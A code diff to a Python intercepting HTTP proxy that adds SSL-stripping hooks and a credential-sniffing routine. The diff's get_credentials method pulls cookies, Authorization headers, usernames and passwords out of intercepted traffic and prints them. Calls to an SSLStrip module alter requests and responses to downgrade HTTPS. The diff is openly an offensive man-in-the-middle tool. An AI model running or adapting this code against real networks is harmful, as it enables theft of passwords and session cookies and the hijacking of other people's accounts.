@@ -10,7 +10,7 @@ from scapy.all import *
 from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
 from SocketServer import ThreadingMixIn
 from cStringIO import StringIO
-
+from SSLStrip import SSLStrip as SSLStrip
 
 class ProxyRequestHandler(BaseHTTPRequestHandler):
     timeout = 10
@@ -18,8 +18,33 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
     def __init__(self, *args, **kwargs):
         self.tls = threading.local()
         self.tls.socket = {}
+        self.SSLStrip = SSLStrip()
         BaseHTTPRequestHandler.__init__(self, *args, **kwargs)
 
+    @staticmethod
+    def get_credentials(headers, body):
+        if headers:
+            cookie_pattern = [ 'Cookie:', 'cookie:']
+            credentials_patern = ['Authorization:', 'authorization:', 'WWW-Authenticate', 'www-authenticate', 'Proxy-Authorization', 'Proxy-Authenticate']
+            for h in headers:
+                for pattern in cookie_pattern:
+                    if re.search(pattern,  headers[h]):
+                        print("\033[91mFOUND COOKIE: {}033[0m".format(headers[h]))
+                for i in credentials_patern:
+                    if re.search(i,  headers[h]):
+                        print("\033[91mFOUND CREDENTIALS: {}033[0m".format(headers[h]))
+        if body:
+            user_regex = '([Uu]ser|[Ll]ogin|[Uu]sername|[Ii][Dd]|[Ee]mail|[Nn]ame)=([^&|;]*)'
+            password_regex = '([Pp]assword|[Pp]ass|[Pp]wd|[Pp]asswd|[Pp]asswrd)=([^&|;]*)'
+            raw = str(body.replace("\n"," "))
+            users = re.findall(user_regex, raw)
+            passwords = re.findall(password_regex, raw)
+            if users:
+                    print("\033[91mFOUND USER: {}033[0m".format(str(users[0][1])))
+            if passwords:
+                    print("\033[91mFOUND USER: {}033[0m".format(str(passwords[0][1])))    
+
+    
     def do_GET(self):
         req = self
         content_length = int(req.headers.get('Content-Length', 0))
@@ -30,18 +55,11 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
             else:
                 req.path = "http://%s%s" % (req.headers['Host'], req.path)
 
-        print("HTTP from: {} \033[94m{} {}\033[0m".format(req.client_address[0][7::] ,req.command, req.path))
+        print("HTTP from: {} \033[94m\033[1m{}\033[0m\033[94m {}\033[0m".format(req.client_address[0][7::] ,req.command, req.path))
+        self.get_credentials(req.headers, req_body)
         
-        #############################""
-        cookie_pattern = [ 'Cookie:', 'cookie:']
-        pwned = ['Authorization:', 'authorization:', 'WWW-Authenticate', 'www-authenticate', 'Proxy-Authorization', 'Proxy-Authenticate']
-        for h in req.headers:
-            for pattern in cookie_pattern:
-                if re.search(pattern,  req.headers[h]):
-                    print("\033[91mFOUND COOKIE: {}033[0m".format(req.headers[h]))
-            for i in pwned:
-                if re.search(i,  req.headers[h]):
-                    print("\033[91mFOUND CREDENTIALS: {}033[0m".format(req.headers[h]))
+        #### TODO: where tha magic happens
+        self.SSLStrip.modify_request(req.headers, req_body)
         ###############
         
         url = urlparse.urlsplit(req.path)
@@ -50,9 +68,12 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
         path = (url.path + '?' + url.query if url.query else url.path)        
         origin = (scheme, netloc)
 
+        req.headers['Host'] = netloc
+
         setattr(req, 'headers', self.clean_headers(req.headers))
+        
         try:
-            if  origin is not self.tls.socket:
+            if origin is not self.tls.socket:
                 if scheme == 'https':
                     pass
                     #self.tls.socket = httplib.HTTPSConnection(netloc, timeout=self.timeout)
@@ -60,11 +81,20 @@ class ProxyRequestHandler(BaseHTTPRequestHandler):
                     self.tls.socket = httplib.HTTPConnection(netloc, timeout=self.timeout)
             self.tls.socket.request(self.command, path, req_body, dict(req.headers))
             res = self.tls.socket.getresponse()
+            print("res:", res.msg)
             setattr(res, 'headers', res.msg)
+            setattr(res, 'response_version', {10: 'HTTP/1.0', 11: 'HTTP/1.1'})
+
             res_body = res.read()
         except Exception as e:
             print ("Exception ---> {}".format(e))
             return
+        encode = res.headers.get('Content-Encoding', 'identity')
+        print("!!!!!!!!!!   Res is encoded in: ", encode)
+
+        #### TODO: where tha magic happens
+        self.SSLStrip.modify_response(req, res, res_body)
+        ###
 
         setattr(res, 'headers', self.clean_headers(res.headers))
         self.wfile.write("%s %d %s\r\n" % (self.protocol_version, res.status, res.reason))
